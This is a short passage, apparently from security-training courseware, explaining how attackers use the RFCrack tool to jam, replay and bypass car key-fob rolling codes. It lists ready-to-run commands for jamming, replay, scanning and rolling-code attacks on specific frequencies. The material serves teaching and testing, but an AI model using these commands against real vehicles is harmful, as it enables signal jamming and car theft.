Attackers use the RFCrack tool to obtain the rolling code sent by the victim to unlock a vehicle and later use the same code for unlocking and stealing the vehicle. 

RFCrack is used for testing RF communications between physical devices that communicate over sub-GHz frequencies. 

It is used along with a combination of hardware such as yardsticks to jam, replay, and sniff the signal coming from the sender. 

Attackers perform the following attacks using RFCrack: 
▪ Perform replay attacks (-i -F) 
▪ Send saved payloads (-s –u) 
▪ Perform rolling-code bypass attacks (-r -F -M) 
▪ Perform jamming (-j -F)
▪ Scan incrementally through frequencies (-b -v -F)
▪ Scan common frequencies (-k)

Commands used by an attacker to perform rolling-code attack are given below: 
▪ Live replay: python RFCrack.py -i
▪ Rolling code: python RFCrack.py -r -M MOD_2FSK -F 314350000
▪ Adjust RSSI range: python RFCrack.py -r -M MOD_2FSK -F 314350000 -U -100 -L -10
▪ Jamming: python RFCrack.py -j -F 314000000
▪ Scan common frequencies: python RFCrack.py -k
▪ Scan with your list: python RFCrack.py -k -f 433000000 314000000 390000000
▪ Incremental scan: python RFCrack.py -b -v 5000000
▪ Send saved payload:
python RFCrack.py -s -u ./captures/test.cap -F 315000000 -M MOD_ASK_OOK
